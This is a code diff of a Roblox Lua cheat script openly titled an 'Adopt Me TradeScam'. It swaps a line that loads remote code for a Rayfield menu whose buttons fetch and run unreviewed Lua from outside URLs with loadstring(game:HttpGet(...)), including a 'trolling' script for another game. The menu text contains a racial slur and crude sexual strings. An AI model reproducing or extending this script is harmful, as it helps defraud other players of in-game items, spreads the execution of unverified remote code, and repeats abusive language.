@@ -1,1 +1,58 @@
-loadstring(game:HttpGet("https://egorikusa.space/7349f170364e71d286e503e8.lua", true))()
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = ":sunglasses: PyroAdoptmeTradescam :sunglasses:",
+   LoadingTitle = "AdoptMe TradeScam",
+   LoadingSubtitle = "by BigDickSenpai65",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "PyroHub"
+   },
+   Discord = {
+      Enabled = false,
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+   KeySystem = False, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Adopt Me TradeScam |KeySystem",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided",
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+local MainTab = Window:CreateTab(":grinning: Welcome To PyroHub 1/1 private script", nil) -- Title, Image
+local MainSection = MainTab:CreateSection("TradeScam")
+
+Rayfield:Notify({
+   Title = "Loaded Script!",
+   Content = "Penis Dick",
+   Duration = 4.5,
+   Image = nil,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "lemme fuck lil nigga!",
+         Callback = function()
+         print("The user tapped Okay!")
+      end
+   },
+},
+})
+
+local Button = MainTab:CreateButton({
+   Name = "PyroHubPremium AdoptMe script",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ultra-Scripts/AdoptmeScript/main/AdoptmeScript/26SYFTB-adopt-me.lua"))()   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Ps99 fe trolling script",
+   Callback = function()
+loadstring(game:HttpGet('https://rentry.co/hgka6mge/raw',true))()
+   end,
+})
